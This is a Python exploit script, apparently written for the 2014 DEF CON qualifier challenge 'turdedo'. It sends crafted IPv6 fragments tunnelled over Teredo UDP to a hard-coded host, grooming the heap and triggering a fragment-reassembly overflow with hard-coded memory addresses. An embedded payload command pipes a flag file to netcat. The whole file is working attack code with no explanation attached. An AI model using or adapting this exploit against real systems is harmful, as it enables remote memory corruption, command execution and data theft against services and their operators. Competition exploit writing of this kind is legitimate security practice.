#!/usr/bin/env python

import os
import sys
import socket
import struct
import time

from dpkt.ip6 import IP6
from dpkt.udp import UDP

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sa = ('75.101.233.3', 3544)

# 75.101.233.3 turdedo_5f55104b1d60779dbe8dcf5df2b186ad.2014.shallweplayaga.me
# 4b65:e903

src = socket.inet_pton(socket.AF_INET6, "2001:0000:ac10:2fa1:0000:f227:4a52:03c9")
dst = socket.inet_pton(socket.AF_INET6, "2001:0000:4b65:e903:0000:f227:b49a:16fc")

#struct ip6_frag {
#    uint8_t  ip6f_nxt;     /* next header */
#    uint8_t  ip6f_reserved;    /* reserved field */
#    uint16_t ip6f_offlg;       /* offset, reserved, and flag */
#    uint32_t ip6f_ident;       /* identification */
#};

frags_to_send = 4

for i in xrange(frags_to_send):
	fragdata = ""
	
	offset = 0 & 0xfff8
	flag = 0x1  # 1 = more fragments coming
	reserved = 0 & 0x6
	
	frag = ""
	frag += struct.pack("!B", 0x11) # ip6f_next IPPROTO_UDP
	frag += struct.pack("!B", 0)  # ip6f_reserved
	frag += struct.pack("!H", offset | flag | reserved) # offlg
	frag += "LOL" + struct.pack("!B", i) # ip6f_ident
	
	frag += fragdata
	
	data = IP6(src=src, dst=dst, data=frag)
	data.plen = len(frag)
	data.nxt = 0x2c
	
	alloc_size = offset + len(frag) + 0x20
	print "Allocation Size: ", hex(alloc_size & 0xffff) 
	s.sendto(str(data), sa)
	time.sleep(0.1)

for i in xrange(0x100):
	fragdata = "r" * (1500-96)
	
	offset = 0 & 0xfff8
	flag = 0x1  # 1 = more fragments coming
	reserved = 0 & 0x6
	
	frag = ""
	frag += struct.pack("!B", 0x11) # ip6f_next IPPROTO_UDP
	frag += struct.pack("!B", 0)  # ip6f_reserved
	frag += struct.pack("!H", offset | flag | reserved) # offlg
	frag += "LO" + struct.pack("!H", i+0x99) # ip6f_ident
	
	frag += fragdata
	
	data = IP6(src=src, dst=dst, data=frag)
	data.plen = len(frag)
	data.nxt = 0x2c
	
	alloc_size = offset + len(frag) + 0x20
	print i, "Allocation Size: ", hex(alloc_size & 0xffff) 
	s.sendto(str(data), sa)


for i in xrange(0, frags_to_send, 2):
	fragdata = "h" * 20
	
	offset = 0 & 0xfff8
	flag = 0x0  # 1 = more fragments coming
	reserved = 0 & 0x6
	
	frag = ""
	frag += struct.pack("!B", 0x11) # ip6f_next IPPROTO_UDP
	frag += struct.pack("!B", 0)  # ip6f_reserved
	frag += struct.pack("!H", offset | flag | reserved) # offlg
	frag += "LOL" + struct.pack("!B", i) # ip6f_ident
	
	frag += fragdata
	
	data = IP6(src=src, dst=dst, data=frag)
	data.plen = len(frag)
	data.nxt = 0x2c
	
	s.sendto(str(data), sa)
	time.sleep(0.1)
	


fragdata = "e" * (400-0x30)
fragdata += 'tttt'
fragdata += src
fragdata += dst
fragdata += struct.pack("I", 0x0804E0B8-0x2c)
fragdata += struct.pack("H", 0x8888)
fragdata += 'bb'
fragdata += '\xff\xff\xff\xff'

fragdata += "h" * 3000


fragdata = fragdata[:1103]
print len(fragdata)

offset = (0xffff - len(fragdata)) & 0xfff8
flag = 0x1  # 1 = more fragments coming
reserved = 0 & 0x6

frag = ""
frag += struct.pack("!B", 0x11) # ip6f_next IPPROTO_UDP
frag += struct.pack("!B", 0)  # ip6f_reserved
frag += struct.pack("!H", offset | flag | reserved) # offlg
frag += 'ryan' # ip6f_ident

frag += fragdata

data = IP6(src=src, dst=dst, data=frag)
data.plen = len(frag)
data.nxt = 0x2c

alloc_size = offset + len(frag) + 0x20
print "Allocation Size: ", hex(alloc_size & 0xffff) 
print "Overflow Size: ", len(fragdata) - (alloc_size & 0xffff)

s.sendto(str(data), sa)

offset = 0x0 & 0xfff8
flag = 0x1  # 1 = more fragments coming
reserved = 0 & 0x6
fragdata = "\xcc\xcc\xcc\xcc" + struct.pack("I", 0x804BC9A) + "cat /home/turdedo/flag | nc localhost 4141\x00"

frag = ""
frag += struct.pack("!B", 0x11) # ip6f_next IPPROTO_UDP
frag += struct.pack("!B", 0)  # ip6f_reserved
frag += struct.pack("!H", offset | flag | reserved) # offlg
frag += 'tttt'
	
frag += fragdata
	
data = IP6(src=src, dst=dst, data=frag)
data.plen = len(frag)
data.nxt = 0x2c
	
s.sendto(str(data), sa)

offset = 0x0 & 0xfff8
flag = 0x1  # 1 = more fragments coming
reserved = 0 & 0x6
fragdata = "\x88" * 0x88

fragdata += struct.pack("I", 0x08048AA0)
fragdata += 'aaaa'
fragdata += struct.pack("I", 0x804E0BC)
fragdata += struct.pack("I", 0x0804C658)

fragdata += "A" * 100

frag = ""
frag += struct.pack("!B", 0x11) # ip6f_next IPPROTO_UDP
frag += struct.pack("!B", 0)  # ip6f_reserved
frag += struct.pack("!H", offset | flag | reserved) # offlg
frag += 'tttt'
	
frag += fragdata
	
data = IP6(src=src, dst=dst, data=frag)
data.plen = len(frag)
data.nxt = 0x2c
	
s.sendto(str(data), sa)
